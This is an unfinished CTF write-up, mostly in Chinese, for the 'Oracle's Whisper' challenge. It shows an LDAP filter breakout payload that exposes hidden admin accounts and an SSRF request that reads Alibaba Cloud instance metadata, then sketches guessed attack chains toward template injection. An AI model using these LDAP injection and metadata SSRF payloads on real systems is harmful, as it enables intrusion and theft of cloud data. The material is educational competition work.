# Oracle's Whisper - ISCC{} CTF Writeup

**Challenge Name:** Oracle's Whisper  
**Author:** Riddler  
**Points:** 150  
**Solves:** 0  

## Challenge Description

> 深处的神谕只对懂得低语的人开口。每一次错误的祷文，都让她吐露一个字节的秘密。
> 
> "The oracle deep within only speaks to those who understand whispers. Each wrong prayer makes her reveal a byte of secret."
>
> "Speak to the oracle in her own tongue."

## Reconnaissance

### Information Gathering

访问主页 `http://39.105.213.28:12605/`，发现三个 API 端点：
- `/graphql`
- `/login`
- `/api/profile`

HTML 注释留下关键提示：
```html
<!-- TODO: review filter parsing before public release -->
```

`robots.txt` 还暴露了以下路径：
- `/api/session/`
- `/api/users/`
- `/api/webhook/`

### Endpoint Exploration

| Endpoint | Method | Response |
|----------|--------|----------|
| `/api/users/search` | GET | 返回 LDAP 搜索结果 |
| `/api/webhook/test` | POST | SSRF 端点 |
| `/api/profile/flag` | GET | 401 (需要认证) |
| `/api/login` | POST | 限速 |
| `/graphql` | POST | GraphQL API |

## GraphQL Schema Discovery

通过 GraphQL 字段建议机制（利用拼写错误触发 "Did you mean" 提示），发现以下 schema：

### Query 类型
- `oracleWhisper`: String → 返回固定字符串 *"The oracle whispers in tongues older than words."*

### Mutation 类型
- `login(username: String!, password: String!): LoginResult`

### LoginResult 类型
- `token`: String
- `error`: String → 错误时返回 *"invalid credentials"*

注：Introspection 已被禁用，无法通过 `__schema`/`__type` 查询。

## LDAP 注入突破

### 发现注入点

在测试 `/api/users/search` 时，最开始尝试 `filter` 参数无效。通过大量参数名 fuzz，发现 `uid` 参数才是真正的 LDAP 注入点：

```
GET /api/users/search?uid=(uid=admin)
```

响应显示：
```json
{
  "filter": "(&(role=user)(uid=(uid=admin)))",
  "error": "filter parse: expected ( at 30"
}
```

这表明后端执行了模板替换：`(&(role=user)(uid={INPUT}))`，`*` 被替换为用户输入。

### 注入验证

简单注入语法测试：

| 输入 | 过滤后 | 结果 |
|------|--------|------|
| `*` | `(&(role=user)(uid=*))` | 返回 3 个用户 |
| `a*` | `(&(role=user)(uid=a*))` | 仅 alice |
| `admin` | `(&(role=user)(uid=admin))` | 空（无此 uid） |

### LDAP Breakout 注入

利用闭合括号和注入额外 LDAP 过滤器：

```
uid=*))(|(uid=*)
```

生成：
```
(&(role=user)(uid=*))(|(uid=*))
```

返回 **5 条记录**（而不仅仅是默认的 3 条），说明突破了原过滤器的限制。

### 发现隐藏条目

5 条 LDAP 条目：

| # | uid | role | email | note |
|---|-----|------|-------|------|
| 1 | alice | user | alice@oracle.local | Welcome traveler. |
| 2 | bob | user | bob@oracle.local | Casual contributor. |
| 3 | carol | user | carol@oracle.local | Reads ancient texts. |
| 4 | **oracle** | **admin** | oracle@whisper.int | Keeper of the inner sanctum. |
| 5 | **archon** | **admin** | archon@whisper.int | Internal cache service at internal-api:6000 (templates under /cache/template). |

其中 admin 用户 `oracle` 和 `archon` 是关键发现，尤其是 `archon` 的 note 提到了内部服务。

## Cloud Metadata SSRF

在使用 `/api/webhook/test` 端点时，发现可以访问阿里云元数据服务：

```json
POST /api/webhook/test
{"url": "http://100.100.100.200/latest/meta-data/"}
```

获取到信息：
- 实例 ID: `i-2ze3efxq3318nwx3co01`
- 区域: `cn-beijing`
- 私有 IP: `172.17.197.185`
- VPC ID: `vpc-2zeege9wp25ybrgmqp1lu`
- 公网 IP: `39.105.213.28`
- SSH 公钥可用
- 无 RAM 角色

## 内部服务发现

`archon` 的 note 揭示了一个内部缓存服务：
> Internal cache service at **internal-api:6000** (templates under /cache/template)

这表明存在模板注入(SSTI)的可能性，但 SSRF 的黑名单阻止了直接访问 `internal-api`。

## 当前进展与推测

### 完成的分析
1. ✅ LDAP 注入点发现 (`uid` 参数)
2. ✅ 隐藏 LDAP 条目枚举（5 条记录）
3. ✅ Admin 用户发现（oracle, archon）
4. ✅ 内部模板服务发现
5. ✅ 云元数据 SSRF

### 待解决的步骤
1. ❌ 获取 oracle/archon 的登录密码
2. ❌ 访问 `internal-api:6000` 模板服务
3. ❌ 利用 SSTI 或直接获取 flag

### 可能的最终攻击链

```
LDAP 注入 → 发现 admin 凭据/密码
    ↓
登录 oracle/archon → 获取 JWT token
    ↓
访问 /api/profile/flag → 获取 ISCC{...}
```

或：

```
LDAP 注入 → 绕过 SSRF 黑名单 → 访问 internal-api:6000
    ↓
SSTI 模板注入 → RCE/文件读取 → 获取 flag
```

## 技术总结

| 技术点 | 详情 |
|--------|------|
| **LDAP 注入** | `uid` 参数存在 LDAP filter 注入，支持 breakout 技巧 |
| **GraphQL** | Introspection 禁用，但字段建议可用 |
| **SSRF** | `/api/webhook/test` 支持 HTTP SSRF，阻止私有 IP 和黑名单主机名 |
| **元数据** | 可通过 `100.100.100.200` 访问阿里云实例元数据 |
| **认证** | 需要有效的 JWT token 访问 `/api/profile/flag` |
